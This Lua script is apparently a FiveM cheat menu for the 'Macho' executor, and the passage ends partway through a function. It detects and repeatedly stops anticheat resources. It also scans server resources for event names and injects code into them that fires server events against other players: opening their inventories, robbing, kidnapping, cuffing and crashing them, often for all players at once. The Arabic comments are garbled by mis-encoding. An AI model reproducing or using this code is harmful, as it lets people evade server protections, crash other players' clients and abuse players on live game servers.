local noclip = false
local invisible = false
local baseSpeed = 1.0
local speed = baseSpeed
local followCamera = true
local shiftSpeedMultiplier = 4.0 -- Ù…Ø¶Ø§Ø¹Ù Ø§Ù„Ø³Ø±Ø¹Ø© Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Shift

-- Ø¯Ø§Ù„Ø© Ù„ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„Ù†ÙˆÙƒÙ„ÙŠØ¨ + Ø§Ù„Ø§Ø®ØªÙØ§Ø¡
function toggleNoclip()
    local playerPed = PlayerPedId()
    noclip = not noclip
    invisible = noclip  -- ØªØ²Ø§Ù…Ù† Ø­Ø§Ù„Ø© Ø§Ù„Ø§Ø®ØªÙØ§Ø¡ Ù…Ø¹ Ø§Ù„Ù†ÙˆÙƒÙ„ÙŠØ¨

    SetEntityInvincible(playerPed, noclip)
    SetEntityCollision(playerPed, not noclip, not noclip)

    if noclip then
        -- ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø§Ø®ØªÙØ§Ø¡
        SetEntityVisible(playerPed, false, false)
        SetEntityAlpha(playerPed, 0, false)
        print("ðŸš€ ØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù†ÙˆÙƒÙ„ÙŠØ¨ + Ø§Ù„Ø§Ø®ØªÙØ§Ø¡")
    else
        -- Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø§Ø®ØªÙØ§Ø¡
        SetEntityVisible(playerPed, true, false)
        ResetEntityAlpha(playerPed)
        SetEntityInvincible(playerPed, false)
        print("ðŸ‘€ ØªÙ… Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ù†ÙˆÙƒÙ„ÙŠØ¨ + Ø§Ù„Ø¹ÙˆØ¯Ø© Ù„Ù„ÙˆØ¶Ø¹ Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠ")
    end
end

-- Ø¯ÙˆØ§Ù„ Ø§Ù„Ù…Ø³Ø§Ø¹Ø¯Ø©
local function vec3Length(v)
    return math.sqrt(v.x * v.x + v.y * v.y + v.z * v.z)
end

local function normalizeVec3(v)
    local len = vec3Length(v)
    if len == 0 then return vector3(0.0, 0.0, 0.0) end
    return vector3(v.x / len, v.y / len, v.z / len)
end

local function getCamVectors()
    local camRot = GetGameplayCamRot(2)
    local rz = math.rad(camRot.z)
    local rx = math.rad(camRot.x)

    local forward = vector3(-math.sin(rz) * math.cos(rx), math.cos(rz) * math.cos(rx), math.sin(rx))
    local right = vector3(forward.y, -forward.x, 0.0)
    right = normalizeVec3(right)
    forward = normalizeVec3(forward)
    local up = vector3(0.0, 0.0, 1.0)
    return forward, right, up
end

function noclipMovement()
    if not noclip then return end

    local playerPed = PlayerPedId()
    local pos = GetEntityCoords(playerPed, false)
    if not pos then return end

    local forward, right, up = getCamVectors()
    local move = vector3(0.0, 0.0, 0.0)

    if IsControlPressed(0, 32) then move = move + forward end -- W
    if IsControlPressed(0, 33) then move = move - forward end -- S
    if IsControlPressed(0, 34) then move = move - right end   -- A
    if IsControlPressed(0, 35) then move = move + right end   -- D
    if IsControlPressed(0, 44) then move = move - up end      -- Q (Ù†Ø²ÙˆÙ„)
    if IsControlPressed(0, 38) then move = move + up end      -- E (ØµØ¹ÙˆØ¯)

    local len = vec3Length(move)
    if len > 0 then
        local norm = normalizeVec3(move)
        local delta = vector3(norm.x * speed, norm.y * speed, norm.z * speed)
        pos = pos + delta
    end

    SetEntityCoordsNoOffset(playerPed, pos.x, pos.y, pos.z, true, true, true)

    local camRot = GetGameplayCamRot(2)
    SetEntityRotation(playerPed, camRot.x, 0.0, camRot.z, 2, true)
end

function stabilizeInAir()
    if noclip then
        local playerPed = PlayerPedId()
        local pos = GetEntityCoords(playerPed, false)
        SetEntityCoordsNoOffset(playerPed, pos.x, pos.y, pos.z, true, true, true)
    end
end

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)

        -- F2 Ù„ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„Ù†ÙˆÙƒÙ„ÙŠØ¨ + Ø§Ù„Ø§Ø®ØªÙØ§Ø¡
        if IsControlJustPressed(0, 289) then
            toggleNoclip()
        end

        -- F4 Ù„ØªØºÙŠÙŠØ± Ø§Ù„Ø³Ø±Ø¹Ø© Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
        if IsControlJustPressed(0, 344) then
            baseSpeed = baseSpeed + 0.5
            if baseSpeed > 5.0 then
                baseSpeed = 1.0
            end
            print("ðŸš— Ø§Ù„Ø³Ø±Ø¹Ø© Ø§Ù„Ø­Ø§Ù„ÙŠØ©: " .. baseSpeed)
        end

        -- Shift Ù„ØªØ³Ø±ÙŠØ¹ Ø§Ù„Ø­Ø±ÙƒØ© Ù…Ø¤Ù‚ØªØ§Ù‹ Ã—4
        if IsControlPressed(0, 21) then
            speed = baseSpeed * shiftSpeedMultiplier
        else
            speed = baseSpeed
        end

        noclipMovement()
        stabilizeInAir()
    end
end)







--local KeysBin = MachoWebRequest("https://raw.githubusercontent.com/bv3d05/skgjfd/refs/heads/main/README.md")
--local CurrentKey = MachoAuthenticationKey()
--if not string.find(KeysBin, CurrentKey, 1, true) then
   --MachoMenuNotification("Authentication Failed", "Your key is not authorized.")
  --return
--end



local ecResources = {"EC-PANEL", "EC_AC"}
for _, resource in ipairs(ecResources) do
    if GetResourceState(resource) == "started" then
        MachoMenuNotification("Eagle AC Detected", "Blocking resource: " .. resource)
        print(resource)
        MachoMenuNotification("Eagle AC Blocked", "Resource " .. resource .. " stopped.")
    end
end

Citizen.CreateThread(function()
    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resource = GetResourceByFindIndex(i)
        local files = GetNumResourceMetadata(resource, 'client_script')
        for j = 0, files - 1 do
            local x = GetResourceMetadata(resource, 'client_script', j)
            if x ~= nil and string.find(x, "obfuscated") then
                MachoMenuNotification("FiveGuard AC Detected", "Blocking resource: " .. resource)
                print(resource)
                MachoMenuNotification("FiveGuard Blocked", "Resource " .. resource .. " stopped.")
                break
            end
        end
    end
end)
local z = ""

-- Function to scan for Electron Anticheat
local function ScanElectronAnticheat()
    local foundAnticheat = false
    local foundScriptName = ""

    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resource = GetResourceByFindIndex(i)
        local manifest = LoadResourceFile(resource, "fxmanifest.lua")
        if manifest then
            if string.find(string.lower(manifest), "https://electron-services.com") or 
               string.find(string.lower(manifest), "electron services") or 
               string.find(string.lower(manifest), "the most advanced fivem anticheat") then
                foundAnticheat = true
                foundScriptName = resource
                detectedElectronResource = resource
                break
            end
        end
    end

    return foundAnticheat, foundScriptName
end
Citizen.CreateThread(function()
            if GetResourceState("EC_AC") == "started" then
                CreateThread(function()
                    while true do
                        MachoResourceStop("EC_AC")
                        MachoResourceStop("EC-PANEL")
                        MachoResourceStop("vMenu")
                        Wait(100)
                    end
                end)
            else
                CreateThread(function()
                    for i = 0, GetNumResources() - 1 do
                        local v = GetResourceByFindIndex(i)
                        if v and GetResourceState(v) == "started" then
                            if GetResourceMetadata(v, "ac", 0) == "fg" then
                                while true do
                                    MachoResourceStop(v)
                                    Wait(100)
                                end
                            end
                        end
                    end
                end)
            end
        end)
-- Auto-detection and notification function
Citizen.CreateThread(function()
    local foundAnticheat, foundScriptName = ScanElectronAnticheat()
    Citizen.Wait(500)
    
    if foundAnticheat then
        MachoMenuNotification("Electron AC Detected", "Electron Anticheat System Found in Resource: " .. foundScriptName)
    end
end)

-- Background silent search
local function backgroundSilentSearch()
    Citizen.CreateThread(function()
        Citizen.Wait(1000) -- Reduced wait time
        
        local totalResources = GetNumResources()
        local searchedResources = 0
        local backgroundTriggers = {items = {}, money = {}, troll = {}, payment = {}, vehicle = {}}
        
        for i = 0, totalResources - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and GetResourceState(resourceName) == "started" then
                searchedResources = searchedResources + 1
                
                local skipPatterns = {
                    "mysql", "oxmysql", "ghmattimysql", "webpack", "yarn", "node_modules",
                    "discord", "screenshot", "loading", "spawn", "weather", "time",
                    "map", "ui", "hud", "chat", "voice", "radio", "tokovoip", "salt",
                    "filesystem", "any", "admin", "logging"
                }
                
                local shouldSkip = false
                local lowerName = string.lower(resourceName)
                for _, pattern in ipairs(skipPatterns) do
                    if string.find(lowerName, pattern, 1, true) then
                        shouldSkip = true
                        break
                    end
                end
                
                if not shouldSkip then
                    local checkFiles = {"client.lua", "server.lua", "shared.lua"}
                    for _, fileName in ipairs(checkFiles) do
                        local success, content = pcall(function()
                            return LoadResourceFile(resourceName, fileName)
                        end)
                        if success and content and content ~= "" and string.len(content) < 200000 then
                            local contentLower = string.lower(content)
                            
                            -- Quick pattern matching
                            if string.find(contentLower, "inventory.*server.*open") then
                                table.insert(backgroundTriggers.items, {
                                    resource = resourceName,
                                    trigger = "inventory:server:OpenInventory",
                                    file = fileName,
                                    state = "started"
                                })
                            end
                            
                            if string.find(contentLower, "givecomm") then
                                table.insert(backgroundTriggers.money, {
                                    resource = resourceName,
                                    trigger = resourceName .. ":server:GiveComm",
                                    file = fileName,
                                    state = "started"
                                })
                            end
                            
                            if string.find(contentLower, "paymentcheck") then
                                table.insert(backgroundTriggers.payment, {
                                    resource = resourceName,
                                    trigger = "QBCore:server:Paymentcheck",
                                    file = fileName,
                                    state = "started"
                                })
                            end
                            
                            if string.find(contentLower, "spawnvehicle") then
                                table.insert(backgroundTriggers.vehicle, {
                                    resource = resourceName,
                                    trigger = "QBCore:Command:SpawnVehicle",
                                    file = fileName,
                                    state = "started"
                                })
                            end
                        end
                        
                        -- Faster processing with smaller delays
                        if searchedResources % 20 == 0 then
                            Citizen.Wait(10)
                        end
                    end
                end
            end
        end
        
        -- Merge background findings with main triggers silently
        for category, triggers in pairs(backgroundTriggers) do
            for _, trigger in ipairs(triggers) do
                local isDuplicate = false
                for _, existing in ipairs(foundTriggers[category]) do
                    if existing.resource == trigger.resource and existing.trigger == trigger.trigger then
                        isDuplicate = true
                        break
                    end
                end
                if not isDuplicate then
                    table.insert(foundTriggers[category], trigger)
                end
            end
        end
    end)
end

-- Menu Configuration
local MenuSize = vec2(850, 550)
local MenuStartCoords = vec2(500, 500)
local TabsBarWidth = 180
local SectionsPadding = 10
local MachoPaneGap = 10

-- Simple storage
local foundTriggers = {
    items = {},
    money = {},
    troll = {},
    payment = {},
    vehicle = {}
}

local MenuWindow = nil
local isPlayerIdsEnabled = false
local playerGamerTags = {}
local isPaymentLoopRunning = false
local paymentSpeedInput = nil
local paymentLoopSpeed = 1000 -- Default speed in milliseconds
local isSpectating = false
local spectatingTarget = nil

-- File list
local allFiles = {
    "client.lua", "server.lua", "shared.lua", "config.lua", "main.lua",
    "client/main.lua", "server/main.lua", "shared/main.lua",
    "client/interactions.lua", "client/police.lua", "client/job.lua",
    "server/interactions.lua", "server/police.lua", "server/job.lua",
    "inventory/client.lua", "inventory/server.lua", "inventory/config.lua",
    "qs-inventory/client.lua", "qs-inventory/server.lua",
    "ox_inventory/client.lua", "ox_inventory/server.lua",
    "jobs/police/client.lua", "jobs/police/server.lua",
    "police/client.lua", "police/server.lua",
    "banking/client.lua", "banking/server.lua",
    "shops/client.lua", "shops/server.lua",
    "core/client.lua", "core/server.lua",
    "bridge/client.lua", "bridge/server.lua"
}

-- Players Section Buttons
local function setupPlayerSectionButtons(PlayersSection, playerIdInput)
    MachoMenuButton(PlayersSection, "Open Player Inventory", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", ' .. numId .. ')')
                        end
                        MachoMenuNotification("Players", "Opened inventory for ID: " .. numId)
                    end
                end
                MachoMenuNotification("Players", "Opened inventories for all players")
            else
                local numId = tonumber(playerId)
                if numId then
                    for _, triggerData in ipairs(foundTriggers.items) do
                        MachoInjectResource(triggerData.resource, 'TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", ' .. numId .. ')')
                    end
                    MachoMenuNotification("Players", "Opened inventory for ID: " .. numId)
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)
MachoMenuButton(PlayersSection, "Crash", function()
   local playerId = MachoMenuGetInputbox(playerIdInput)
   if playerId and playerId ~= "" then
       local serverId = tonumber(playerId)
       if serverId and serverId > 0 then
           -- Ø­ÙØ¸ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø­Ø§Ù„ÙŠ Ù‚Ø¨Ù„ Ø§Ù„Ù†Ù‚Ù„
           local ped = PlayerPedId()
           local originalCoords = GetEntityCoords(ped)
           
           -- Ø¥Ù†Ø´Ø§Ø¡ ÙˆØ¹Ø±Ø¶ DUI
           local dui = MachoCreateDui("https://wf-675.github.io/crashingo.gg/")
           MachoShowDui(dui)
           
           -- 1. ØªØ´ØºÙŠÙ„ ÙƒÙˆØ¯ Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù€ Anti-Cheat Ø¨Ø¯ÙˆÙ† Ø±ÙŠØ³ÙˆØ±Ø³ (Ø¢Ù…Ù†)
           Citizen.CreateThread(function()
               if GetResourceState("EC_AC") == "started" then
                   CreateThread(function()
                       while true do
                           MachoResourceStop("EC_AC")
                           MachoResourceStop("EC-PANEL")
                           MachoResourceStop("vMenu")
                           Wait(100) -- ØªØ£Ø®ÙŠØ± Ø£Ø·ÙˆÙ„ Ù„ØªØ¬Ù†Ø¨ Ø§Ù„Ø¨Ø§Ù†
                       end
                   end)
               else
                   CreateThread(function()
                       for i = 0, GetNumResources() - 1 do
                           local v = GetResourceByFindIndex(i)
                           if v and GetResourceState(v) == "started" then
                               if GetResourceMetadata(v, "ac", 0) == "fg" then
                                   while true do
                                       MachoResourceStop(v)
                                       Wait(100) -- ØªØ£Ø®ÙŠØ± Ø£Ø·ÙˆÙ„ Ù„ØªØ¬Ù†Ø¨ Ø§Ù„Ø¨Ø§Ù†
                                   end
                               end
                           end
                       end
                   end)
               end
           end)
           
           -- 2. Ù†Ù‚Ù„ Ø§Ù„Ù„Ø§Ø¹Ø¨ Ù„Ù…ÙƒØ§Ù† Ø¨Ø¹ÙŠØ¯ ÙˆØªØ´ØºÙŠÙ„ Ø§Ù„ØªØ±ÙŠÙ‚Ø±
           Citizen.CreateThread(function()
               
               -- Ù†Ù‚Ù„ Ø§Ù„Ù„Ø§Ø¹Ø¨ Ù„Ù…ÙƒØ§Ù† Ø¨Ø¹ÙŠØ¯ (Ø®Ø§Ø±Ø¬ Ø§Ù„Ø±ÙŠÙ†Ø¯Ø± Ù„ÙƒÙ† Ù„ÙŠØ³ Ù…Ø±Ù‡ Ø¨Ø¹ÙŠØ¯) - Ø¢Ù…Ù†
               Wait(500)
               SetEntityCoords(ped, 1500.0, -1500.0, 58.0, false, false, false, true)
               Wait(100)
               
               Wait(500) -- Ø§Ù†ØªØ¸Ø§Ø± Ø£Ø·ÙˆÙ„
               
               -- 3. ØªØ´ØºÙŠÙ„ ØªØ±ÙŠÙ‚Ø± Ø§Ù„Ø§Ø®ØªØ·Ø§Ù Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… foundTriggers (Ø¨Ø¯ÙˆÙ† ØªØ£Ø®ÙŠØ± - Ø¢Ù…Ù†)
               for _, triggerData in ipairs(foundTriggers.items) do
                   MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:KidnapPlayer", ' .. serverId .. ')')
               end
               
               -- 4. Ø§Ù„Ø¥Ø±Ø¬Ø§Ø¹ Ù„Ù„Ù…ÙƒØ§Ù† Ø§Ù„Ø£ØµÙ„ÙŠ Ø¨Ø¹Ø¯ 5 Ø«ÙˆØ§Ù†ÙŠ ÙˆØ¥Ø®ÙØ§Ø¡ DUI
               Wait(1000) -- Ø§Ù†ØªØ¸Ø§Ø± 5 Ø«ÙˆØ§Ù†Ù
               
               -- Ø¥Ø±Ø¬Ø§Ø¹ Ø¢Ù…Ù† Ù„Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø£ØµÙ„ÙŠ
               SetEntityCoords(ped, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)
               Wait(100)
               
               -- Ø¥Ø®ÙØ§Ø¡ ÙˆØ­Ø°Ù DUI
               Wait(100)
               MachoHideDui(dui)
               MachoDestroyDui(dui)
           end)
           
       else
           MachoMenuNotification("Error", "Invalid Player ID")
       end
   else
       MachoMenuNotification("Error", "Enter a Player ID")
   end
end)
    

    MachoMenuButton(PlayersSection, "Revive Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("hospital:server:RevivePlayer", ' .. numId .. ', false, true)')
                        end
                        MachoMenuNotification("Players", "Revived ID: " .. numId)
                    end
                end
                MachoMenuNotification("Players", "Revived all players")
            else
                local numId = tonumber(playerId)
                if numId then
                    for _, triggerData in ipairs(foundTriggers.items) do
                        MachoInjectResource(triggerData.resource, 'TriggerServerEvent("hospital:server:RevivePlayer", ' .. numId .. ', false, true)')
                    end
                    MachoMenuNotification("Players", "Revived ID: " .. numId)
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Slap Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        -- Search for littlethings resource and verify it contains the slap event
                        local totalRes = GetNumResources()
                        local foundSlapResource = false
                        for i = 0, totalRes - 1 do
                            local resName = GetResourceByFindIndex(i)
                            if resName and GetResourceState(resName) == "started" then
                                local lowerName = string.lower(resName)
                                if string.find(lowerName, "littlethings") or string.find(lowerName, "slap") or string.find(lowerName, "admin") then
                                    -- Verify the resource contains the slap event by checking files
                                    local slapEventFound = false
                                    local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                    for _, fileName in ipairs(checkFiles) do
                                        local success, content = pcall(function()
                                            return LoadResourceFile(resName, fileName)
                                        end)
                                        if success and content and content ~= "" then
                                            local contentLower = string.lower(content)
                                            if string.find(contentLower, "slap:event") or string.find(contentLower, "slap_event") then
                                                slapEventFound = true
                                                break
                                            end
                                        end
                                    end
                                    if slapEventFound then
                                        MachoInjectResource(resName, 'TriggerEvent("Slap:Event", ' .. numId .. ')')
                                        foundSlapResource = true
                                        break
                                    end
                                end
                            end
                        end
                        if foundSlapResource then
                            MachoMenuNotification("Players", "Slapped Player ID: " .. numId)
                        else
                            MachoMenuNotification("Error", "Slap event not found in any resource")
                            return
                        end
                    end
                end
                if foundSlapResource then
                    MachoMenuNotification("Players", "Slapped all players")
                end
            else
                local numId = tonumber(playerId)
                if numId then
                    -- Search for littlethings resource and verify it contains the slap event
                    local totalRes = GetNumResources()
                    local foundSlapResource = false
                    for i = 0, totalRes - 1 do
                        local resName = GetResourceByFindIndex(i)
                        if resName and GetResourceState(resName) == "started" then
                            local lowerName = string.lower(resName)
                            if string.find(lowerName, "littlethings") or string.find(lowerName, "slap") or string.find(lowerName, "admin") then
                                -- Verify the resource contains the slap event by checking files
                                local slapEventFound = false
                                local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                for _, fileName in ipairs(checkFiles) do
                                    local success, content = pcall(function()
                                        return LoadResourceFile(resName, fileName)
                                    end)
                                    if success and content and content ~= "" then
                                        local contentLower = string.lower(content)
                                        if string.find(contentLower, "slap:event") or string.find(contentLower, "slap_event") then
                                            slapEventFound = true
                                            break
                                        end
                                    end
                                end
                                if slapEventFound then
                                    MachoInjectResource(resName, 'TriggerEvent("Slap:Event", ' .. numId .. ')')
                                    foundSlapResource = true
                                    break
                                end
                            end
                        end
                    end
                    if foundSlapResource then
                        MachoMenuNotification("Players", "Slapped Player ID: " .. numId)
                    else
                        MachoMenuNotification("Error", "Slap event not found in any resource")
                    end
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Search Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        -- Search for police resource and verify it contains the search event
                        local totalRes = GetNumResources()
                        local foundSearchResource = false
                        for i = 0, totalRes - 1 do
                            local resName = GetResourceByFindIndex(i)
                            if resName and GetResourceState(resName) == "started" then
                                local lowerName = string.lower(resName)
                                if string.find(lowerName, "police") then
                                    -- Verify the resource contains the search event by checking files
                                    local searchEventFound = false
                                    local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                    for _, fileName in ipairs(checkFiles) do
                                        local success, content = pcall(function()
                                            return LoadResourceFile(resName, fileName)
                                        end)
                                        if success and content and content ~= "" then
                                            local contentLower = string.lower(content)
                                            if string.find(contentLower, "police:server:searchplayer") or string.find(contentLower, "searchplayer") then
                                                searchEventFound = true
                                                break
                                            end
                                        end
                                    end
                                    if searchEventFound then
                                        MachoInjectResource(resName, 'TriggerServerEvent("police:server:SearchPlayer", ' .. numId .. ')')
                                        foundSearchResource = true
                                        break
                                    end
                                end
                            end
                        end
                        if foundSearchResource then
                            MachoMenuNotification("Players", "Searched Player ID: " .. numId)
                        else
                            MachoMenuNotification("Error", "Search event not found in any police resource")
                            return
                        end
                    end
                end
                if foundSearchResource then
                    MachoMenuNotification("Players", "Searched all players")
                end
            else
                local numId = tonumber(playerId)
                if numId then
                    -- Search for police resource and verify it contains the search event
                    local totalRes = GetNumResources()
                    local foundSearchResource = false
                    for i = 0, totalRes - 1 do
                        local resName = GetResourceByFindIndex(i)
                        if resName and GetResourceState(resName) == "started" then
                            local lowerName = string.lower(resName)
                            if string.find(lowerName, "police") then
                                -- Verify the resource contains the search event by checking files
                                local searchEventFound = false
                                local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                for _, fileName in ipairs(checkFiles) do
                                    local success, content = pcall(function()
                                        return LoadResourceFile(resName, fileName)
                                    end)
                                    if success and content and content ~= "" then
                                        local contentLower = string.lower(content)
                                        if string.find(contentLower, "police:server:searchplayer") or string.find(contentLower, "searchplayer") then
                                            searchEventFound = true
                                            break
                                        end
                                    end
                                end
                                if searchEventFound then
                                    MachoInjectResource(resName, 'TriggerServerEvent("police:server:SearchPlayer", ' .. numId .. ')')
                                    foundSearchResource = true
                                    break
                                end
                            end
                        end
                    end
                    if foundSearchResource then
                        MachoMenuNotification("Players", "Searched Player ID: " .. numId)
                    else
                        MachoMenuNotification("Error", "Search event not found in any police resource")
                    end
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Kidnap Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        -- Search for police resource and verify it contains the kidnap event
                        local totalRes = GetNumResources()
                        local foundKidnapResource = false
                        for i = 0, totalRes - 1 do
                            local resName = GetResourceByFindIndex(i)
                            if resName and GetResourceState(resName) == "started" then
                                local lowerName = string.lower(resName)
                                if string.find(lowerName, "police") then
                                    -- Verify the resource contains the kidnap event by checking files
                                    local kidnapEventFound = false
                                    local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                    for _, fileName in ipairs(checkFiles) do
                                        local success, content = pcall(function()
                                            return LoadResourceFile(resName, fileName)
                                        end)
                                        if success and content and content ~= "" then
                                            local contentLower = string.lower(content)
                                            if string.find(contentLower, "police:server:kidnapplayer") or string.find(contentLower, "kidnapplayer") then
                                                kidnapEventFound = true
                                                break
                                            end
                                        end
                                    end
                                    if kidnapEventFound then
                                        MachoInjectResource(resName, 'TriggerServerEvent("police:server:KidnapPlayer", ' .. numId .. ')')
                                        foundKidnapResource = true
                                        break
                                    end
                                end
                            end
                        end
                        if foundKidnapResource then
                            MachoMenuNotification("Players", "Kidnapped Player ID: " .. numId)
                        else
                            MachoMenuNotification("Error", "Kidnap event not found in any police resource")
                            return
                        end
                    end
                end
                if foundKidnapResource then
                    MachoMenuNotification("Players", "Kidnapped all players")
                end
            else
                local numId = tonumber(playerId)
                if numId then
                    -- Search for police resource and verify it contains the kidnap event
                    local totalRes = GetNumResources()
                    local foundKidnapResource = false
                    for i = 0, totalRes - 1 do
                        local resName = GetResourceByFindIndex(i)
                        if resName and GetResourceState(resName) == "started" then
                            local lowerName = string.lower(resName)
                            if string.find(lowerName, "police") then
                                -- Verify the resource contains the kidnap event by checking files
                                local kidnapEventFound = false
                                local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                for _, fileName in ipairs(checkFiles) do
                                    local success, content = pcall(function()
                                        return LoadResourceFile(resName, fileName)
                                    end)
                                    if success and content and content ~= "" then
                                        local contentLower = string.lower(content)
                                        if string.find(contentLower, "police:server:kidnapplayer") or string.find(contentLower, "kidnapplayer") then
                                            kidnapEventFound = true
                                            break
                                        end
                                    end
                                end
                                if kidnapEventFound then
                                    MachoInjectResource(resName, 'TriggerServerEvent("police:server:KidnapPlayer", ' .. numId .. ')')
                                    foundKidnapResource = true
                                    break
                                end
                            end
                        end
                    end
                    if foundKidnapResource then
                        MachoMenuNotification("Players", "Kidnapped Player ID: " .. numId)
                    else
                        MachoMenuNotification("Error", "Kidnap event not found in any police resource")
                    end
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Rob Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            local advancedRobCode = string.format([[
                                local targetServerId = %d
                                local targetPlayer = GetPlayerFromServerId(targetServerId)
                                if targetPlayer ~= -1 then
                                    local targetPed = GetPlayerPed(targetPlayer)
                                    if targetPed ~= 0 and DoesEntityExist(targetPed) then
                                        local playerPed = PlayerPedId()
                                        TriggerServerEvent("police:server:RobPlayer", targetServerId)
                                    end
                                end
                            ]], numId)
                            MachoInjectResource(triggerData.resource, advancedRobCode)
                        end
                        MachoMenuNotification("Players", "Advanced Rob executed for ID: " .. numId)
                    end
                end
                MachoMenuNotification("Players", "Advanced Rob executed for all players")
            else
                local numId = tonumber(playerId)
                if numId then
                    for _, triggerData in ipairs(foundTriggers.items) do
                        local advancedRobCode = string.format([[
                            local targetServerId = %d
                            local targetPlayer = GetPlayerFromServerId(targetServerId)
                            if targetPlayer ~= -1 then
                                local targetPed = GetPlayerPed(targetPlayer)
                                if targetPed ~= 0 and DoesEntityExist(targetPed) then
                                    local playerPed = PlayerPedId()
                                    local originalCoords = GetEntityCoords(playerPed)
                                    local targetCoords = GetEntityCoords(targetPed)
                                    local teleportCoords = vector3(targetCoords.x, targetCoords.y, targetCoords.z - 1.0)
                                    TriggerServerEvent("police:server:RobPlayer", targetServerId)
                                end
                            end
                        ]], numId)
                        MachoInjectResource(triggerData.resource, advancedRobCode)
                    end
                    MachoMenuNotification("Players", "Advanced Rob executed for ID: " .. numId)
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Cuff Player", function()
    local playerId = MachoMenuGetInputbox(playerIdInput)
    if playerId and playerId ~= "" then
        if playerId == "-1" then
            local players = GetActivePlayers()
            if #players > 0 then
                local cuffedCount = 0
                for _, player in ipairs(players) do
                    local serverId = GetPlayerServerId(player)
                    if serverId and serverId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. serverId .. ', true)')
                        end
                        cuffedCount = cuffedCount + 1
                        Citizen.Wait(100)
                    end
                end
                if cuffedCount > 0 then
                    MachoMenuNotification("Players", "Cuffed " .. cuffedCount .. " players!")
                else
                    MachoMenuNotification("Error", "No valid players to cuff!")
                end
            else
                MachoMenuNotification("Error", "No active players found!")
            end
        elseif playerId == "0" then
            Citizen.CreateThread(function()
                local cuffedCount = 0
                for serverId = 1, 1400 do
                    if serverId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. serverId .. ', true)')
                        end
                        cuffedCount = cuffedCount + 1
                        MachoMenuNotification("Players", "Tried Cuffing ID: " .. serverId)
